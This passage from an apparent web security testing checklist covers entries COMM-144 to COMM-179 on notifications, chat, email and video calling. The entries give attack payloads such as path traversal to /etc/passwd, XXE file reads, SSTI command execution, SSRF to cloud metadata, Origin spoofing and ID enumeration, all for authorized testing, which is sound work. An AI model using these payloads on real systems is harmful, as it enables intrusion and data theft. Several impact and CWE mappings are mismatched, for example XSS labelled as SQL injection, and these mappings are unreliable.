**Expected Result:** Application must limit concurrent WebSocket connections per user and implement server-level connection pooling.

**Payload Example:**

```
Open 1000+ concurrent WebSocket connections from same account;test server stability under connection pressure
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** wscat;Custom Scripts;JMeter

**References:** CWE-840; PortSwigger Business logic

---

## COMM-144 — WebSocket Message Tampering
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Intercept WebSocket messages between client and server. 2. Modify message content in transit. 3. Check if tampered messages are processed without integrity verification.

**Expected Result:** Application must implement message integrity checks and validate all incoming WebSocket messages server-side.

**Payload Example:**

```
Intercept and modify WebSocket message {"action":"read_notification",id:"1001"} to {"action":"delete_all",id:"*"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;wscat;mitmproxy

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-145 — WebSocket Origin Validation Bypass
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Connect to the WebSocket endpoint from an unauthorized origin. 2. Modify the Origin header. 3. Check if the server validates the Origin during the handshake.

**Expected Result:** Application must validate the Origin header during WebSocket handshake and reject connections from unauthorized origins.

**Payload Example:**

```
Connect with Origin: https://evil.com;Origin: null;remove Origin header entirely during WebSocket upgrade
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## COMM-146 — Notification Center API Rate Limiting
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Send rapid requests to the notification center API. 2. Check for rate limiting. 3. Attempt to bypass rate limits. 4. Test for performance degradation under high load.

**Expected Result:** Application must implement rate limiting on notification center API endpoints to prevent abuse.

**Payload Example:**

```
Send 1000+ GET /api/notifications requests per minute;bypass with X-Forwarded-For rotation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-147 — Notification Center GraphQL Over-Fetching
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. If notifications use GraphQL craft deeply nested queries. 2. Request excessive fields through notification relationships. 3. Check for data over-exposure.

**Expected Result:** Application must implement field-level authorization and query depth limiting in GraphQL notification endpoints.

**Payload Example:**

```
{notifications{id;message;user{id;email;password;orders{id;total;paymentMethod{cardNumber}}}}}
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** Burp Suite;InQL;GraphQL Voyager

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## COMM-148 — Read Status Privacy Violation
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Read / Unread Status

**Test Steps:** 1. Send a notification to another user. 2. Check if read receipts reveal when and where the notification was read. 3. Verify if read status tracking is disclosed to senders.

**Expected Result:** Application must respect user privacy preferences regarding read receipts and not expose detailed read information without consent.

**Payload Example:**

```
Check API response for read_at;read_device;read_ip;read_location fields visible to notification sender
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## COMM-149 — Read Status Manipulation for Social Engineering
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Read / Unread Status

**Test Steps:** 1. Mark notifications as unread after reading them. 2. Check if this creates false urgency indicators. 3. Test if read status can be manipulated to deceive other users or systems.

**Expected Result:** Application must maintain accurate read status history and prevent manipulation that could facilitate social engineering.

**Payload Example:**

```
Toggle read status repeatedly;mark critical notifications as unread to avoid audit trail detection
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-150 — Notification Preference Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Access notification preference endpoints for various user IDs. 2. Check if preferences reveal user behavior patterns. 3. Enumerate user IDs through preference endpoints.

**Expected Result:** Application must not expose notification preferences to unauthorized users and must prevent user enumeration through preference endpoints.

**Payload Example:**

```
GET /api/notification-preferences?user_id=1 through user_id=10000 and note valid vs invalid responses
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COMM-151 — Notification Channel Override Attack
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Set notification preferences to in-app only. 2. Intercept the preference update. 3. Add hidden channels like sms_enabled=true or email_enabled=true. 4. Check if notifications are sent via channels the user did not select.

**Expected Result:** Application must strictly enforce user-selected notification channels and not enable additional channels through parameter injection.

**Payload Example:**

```
Add sms_enabled=true&email_enabled=true&push_enabled=true to preference update even when user selected only in_app
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-152 — Digest Email Content SSRF via Aggregated Links
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. If digest emails fetch preview images or content for aggregated items inject internal URLs in item images or links. 2. Trigger digest generation. 3. Check for SSRF.

**Expected Result:** Application must validate all URLs fetched during digest email generation and block access to internal network resources.

**Payload Example:**

```
Create item with image_url=http://169.254.169.254/latest/meta-data/ that gets aggregated into digest email
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-153 — Digest Email Data Aggregation Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Trigger a digest email. 2. Check if the aggregated content includes data the user should not have access to. 3. Verify authorization on aggregated data items.

**Expected Result:** Digest emails must only aggregate data the user is authorized to see and not leak cross-user or privileged information.

**Payload Example:**

```
Review digest email for notifications or activities from private channels or other users' data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Email Client;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-154 — Transactional Email Token Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. Trigger transactional emails containing action tokens like password reset or verification. 2. Check if tokens are exposed in email headers or tracking links. 3. Verify token security.

**Expected Result:** Transactional email tokens must be cryptographically random and not leaked through email headers or tracking parameters.

**Payload Example:**

```
Check email for reset_token in Referer-leaking links;token in tracking pixel URL;token in email headers
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Email Client;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-155 — Transactional Email Spoofing Prevention Check
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Transactional Emails

**Test Steps:** 1. Check SPF/DKIM/DMARC records for the sending domain. 2. Attempt to spoof transactional emails from the application's domain. 3. Verify email authentication headers.

**Expected Result:** Application must configure SPF/DKIM/DMARC properly to prevent spoofing of transactional emails from the application's domain.

**Payload Example:**

```
dig TXT target.com;dig TXT _dmarc.target.com;dig TXT selector._domainkey.target.com;test spoofing
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** MXToolbox;dig;Email Spoofing Tools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## COMM-156 — Marketing Email Pixel Tracking SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. If marketing emails include tracking pixels from user-controllable URLs check for SSRF. 2. Inject internal URLs as custom tracking endpoints. 3. Verify server-side fetching.

**Expected Result:** Application must validate tracking pixel URLs and prevent SSRF through marketing email tracking mechanisms.

**Payload Example:**

```
tracking_pixel_url=http://169.254.169.254/latest/meta-data/;custom_tracker=http://localhost:9200/_cluster/health
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-157 — Marketing Email A/B Test Content Injection
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Marketing Emails

**Test Steps:** 1. If A/B testing for marketing emails is exposed check if variant content can be manipulated. 2. Inject malicious content in A/B test variants. 3. Verify content validation.

**Expected Result:** Application must sanitize and validate all A/B test variant content and restrict variant creation to authorized marketing roles.

**Payload Example:**

```
Inject XSS or phishing content in variant_b_content=<script>alert(1)</script> or variant content with malicious links
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-158 — Chat Message Editing Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Send a chat message. 2. Rapidly edit the message to change content after it has been read. 3. Check if edit history is maintained. 4. Test for race conditions in edit and delete.

**Expected Result:** Application must maintain message edit history and implement proper concurrency controls for message modifications.

**Payload Example:**

```
Send message then rapidly PUT /api/chat/messages/MSG-1001 with different content;check if original is preserved
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## COMM-159 — Chat Message Search Data Leakage
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Search chat messages. 2. Check if search results include messages from conversations the user is not part of. 3. Test search scope limitations.

**Expected Result:** Application must scope chat search results to only conversations the authenticated user is a participant in.

**Payload Example:**

```
GET /api/chat/search?q=confidential and check if results include messages from non-participating conversations
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-160 — Chat User Presence Information Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Check user online/offline status indicators. 2. Monitor presence status for users not in your contact list. 3. Verify if presence data can be used for surveillance.

**Expected Result:** Application must respect user privacy settings for presence status and not expose online status to unauthorized users.

**Payload Example:**

```
GET /api/chat/presence?user_id=1002 or subscribe to WebSocket presence channel for non-contact users
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;wscat

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-161 — Chat Group Creation Authorization Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Create a chat group. 2. Add users who have not consented to join. 3. Add admin users or support staff. 4. Check if group membership is validated.

**Expected Result:** Application must require user consent or authorization before adding them to chat groups.

**Payload Example:**

```
POST /api/chat/groups/create with members=[1001;1002;admin_user;support_user] without their consent
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-162 — Chat Attachment Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Download a chat attachment. 2. Modify the file path parameter in the download request. 3. Attempt to read arbitrary files from the server.

**Expected Result:** Application must validate file paths and restrict access to authorized attachment directories only.

**Payload Example:**

```
GET /api/chat/attachments/download?file=../../../etc/passwd;file=....//....//app/config/database.yml
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## COMM-163 — Video Call SRTP Key Exchange Weakness
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Analyze the SRTP key exchange mechanism. 2. Check for weak key exchange protocols. 3. Test if SRTP keys can be intercepted or predicted. 4. Verify SRTP fingerprint validation.

**Expected Result:** Application must use strong SRTP key exchange mechanisms like DTLS-SRTP and verify fingerprints to prevent MITM attacks.

**Payload Example:**

```
Capture DTLS handshake;check for weak cipher suites;test SRTP fingerprint mismatch acceptance
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Wireshark;WebRTC Internals;Custom Tools

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## COMM-164 — Video Call Recording Unauthorized Download
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. If call recordings exist enumerate recording URLs. 2. Access recordings without proper authorization. 3. Check for direct object reference vulnerabilities in recording storage.

**Expected Result:** Application must enforce authorization on recording access and use non-guessable storage paths with signed URLs.

**Payload Example:**

```
Enumerate GET /api/recordings/REC-0001 through REC-9999;access S3 URLs directly without auth tokens
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-165 — Video Call Lobby Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. If calls have a lobby or waiting room attempt to bypass it. 2. Join directly to the call room without host approval. 3. Modify the join request to skip lobby.

**Expected Result:** Application must enforce lobby or waiting room access controls server-side and prevent unauthorized direct room access.

**Payload Example:**

```
Add skip_lobby=true or approved=true to POST /api/video/join/ROOM-1001;modify WebSocket join message
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-166 — Contact Form XXE via XML Content Type
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Change the Content-Type of the contact form submission to application/xml. 2. Submit XML with XXE payload. 3. Check if the server processes XML and resolves external entities.

**Expected Result:** Application must validate Content-Type and disable external entity processing if XML parsing is supported.

**Payload Example:**

```
Change Content-Type to application/xml and submit <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><contact><message>&xxe;</message></contact>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## COMM-167 — Contact Form Blind SSRF via URL Fields
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. If the contact form has website or URL fields submit internal URLs. 2. Check if the server makes requests to submitted URLs for validation or preview. 3. Monitor for SSRF.

**Expected Result:** Application must not fetch user-provided URLs server-side from contact form submissions or must validate against an allowlist.

**Payload Example:**

```
website=http://169.254.169.254/latest/meta-data/;url=http://localhost:8080/admin;website=http://internal-service:3306/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-168 — Newsletter Double Opt-In Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Subscribe to the newsletter. 2. Check if double opt-in is required. 3. Attempt to bypass the confirmation step by directly calling the confirmation endpoint with guessed tokens.

**Expected Result:** Application must use cryptographically random confirmation tokens and enforce the double opt-in process.

**Payload Example:**

```
Enumerate /newsletter/confirm?token=0001 through token=9999;try /newsletter/confirm?email=test@test.com&force=true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COMM-169 — Newsletter Subscription Mass Registration
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Script automated newsletter subscriptions with thousands of different email addresses. 2. Check for rate limiting. 3. Test if the subscription system can be abused for spam or list pollution.

**Expected Result:** Application must implement rate limiting and CAPTCHA on newsletter subscriptions to prevent automated mass registration.

**Payload Example:**

```
Send 10000+ POST /api/newsletter/subscribe with generated email addresses to pollute subscriber list
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COMM-170 — Announcement Content SSTI
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. If announcement creation is accessible inject SSTI payloads in announcement content. 2. Submit and view the rendered announcement. 3. Check if template expressions are evaluated.

**Expected Result:** Application must escape template syntax in announcement content and render announcements as static content.

**Payload Example:**

```
title={{7*7}};body=${T(java.lang.Runtime).getRuntime().exec('id')};content=<%=system('whoami')%>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## COMM-171 — Broadcast API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Check if broadcast sending uses API keys or tokens. 2. Search client-side code for exposed broadcast API keys. 3. Test if exposed keys allow unauthorized broadcasting.

**Expected Result:** Application must keep broadcast API keys server-side only and never expose them in client-accessible code.

**Payload Example:**

```
Search JavaScript files for broadcast_api_key;push_server_key;fcm_server_key;notification_secret
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;GitLeaks;TruffleHog

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-172 — Broadcast Message Replay Attack
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Capture a broadcast message request. 2. Replay the same request multiple times. 3. Check if duplicate broadcasts are sent. 4. Verify idempotency controls.

**Expected Result:** Application must implement idempotency tokens to prevent duplicate broadcast sends from replayed requests.

**Payload Example:**

```
Replay POST /api/broadcasts/send with same payload 50 times and check for duplicate broadcasts
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-173 — Email Notification Queue Poisoning
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. If the email notification system uses a message queue test for queue poisoning. 2. Inject malicious messages into the queue. 3. Check for deserialization or command injection in queue consumers.

**Expected Result:** Application must validate and sanitize all data in the notification queue and prevent unauthorized queue access.

**Payload Example:**

```
Inject malicious serialized objects or commands into email notification queue;test for deserialization attacks
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-174 — SMS API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Search client-side code for SMS API credentials. 2. Check for Twilio or Nexmo or other SMS provider API keys in JavaScript. 3. Test if exposed keys allow unauthorized SMS sending.

**Expected Result:** Application must keep SMS provider API keys server-side only and never expose them in client-accessible code.

**Payload Example:**

```
Search JS files for twilio_sid;twilio_auth_token;nexmo_api_key;sms_api_secret
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;GitLeaks;TruffleHog

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-175 — FCM/APNs Server Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. Search for Firebase Cloud Messaging or Apple Push Notification service credentials in client code. 2. Check for server keys in mobile app decompilation. 3. Test if keys allow unauthorized push sending.

**Expected Result:** Application must protect FCM/APNs server keys and never expose them in client-side code or mobile applications.

**Payload Example:**

```
Search for AIzaSy;AAAA (FCM key patterns);check mobile app for embedded server keys
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;apktool;jadx;GitLeaks

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-176 — Chat End-to-End Encryption Verification
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. If E2E encryption is claimed verify the implementation. 2. Check if encryption keys are properly managed. 3. Test if the server can access plain-text messages. 4. Verify key exchange protocol.

**Expected Result:** Application must implement proper E2E encryption with verified key exchange if claimed and ensure the server cannot access plain-text message content.

**Payload Example:**

```
Capture encrypted messages;verify key exchange;check if server stores plain-text copies;test key rotation
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Wireshark;mitmproxy;Custom Scripts

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## COMM-177 — Chat Message Forwarding Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Chat / Messaging

**Test Steps:** 1. Forward a chat message from a private conversation. 2. Check if forwarding restrictions are enforced. 3. Verify if forwarded messages maintain original context and attribution.

**Expected Result:** Application must enforce forwarding restrictions based on conversation privacy settings and maintain message attribution.

**Payload Example:**

```
Forward message from restricted conversation to public channel;check if forward_restricted flag is enforced
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-178 — Video Call Bandwidth Abuse for DoS
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Video Calling

**Test Steps:** 1. Join a video call and send extremely high-resolution video or rapid quality changes. 2. Check if bandwidth limits are enforced. 3. Monitor for impact on other participants.

**Expected Result:** Application must implement bandwidth limits and quality controls per participant to prevent denial-of-service through resource abuse.

**Payload Example:**

```
Stream 4K video in a call;rapidly switch between quality levels;send large screen share payloads
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** WebRTC Internals;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## COMM-179 — Contact Form Log Injection
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit the contact form with log injection payloads. 2. Include newlines and fake log entries in message fields. 3. Check if log files are contaminated.

**Expected Result:** Application must sanitize all logged data from contact form submissions to prevent log injection and forgery.
